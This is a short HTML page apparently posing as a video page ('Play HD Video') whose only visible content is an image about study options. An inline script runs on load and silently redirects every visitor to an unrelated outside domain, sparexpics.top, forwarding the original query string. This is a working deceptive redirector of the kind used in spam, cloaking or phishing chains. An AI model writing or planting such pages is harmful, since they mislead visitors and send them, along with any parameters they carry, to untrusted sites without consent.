<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Play HD Video</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <main class="hero">
    <img src="image.png" alt="Explore personalised study options">
  </main>

  <script>
    (function () {
      var destination = "https://sparexpics.top/";
      var queryString = window.location.search; // includes leading "?" if present, already URL-encoded
      var finalUrl = queryString ? destination + queryString : destination;
      window.location.replace(finalUrl);
    })();
  </script>
</body>
</html>
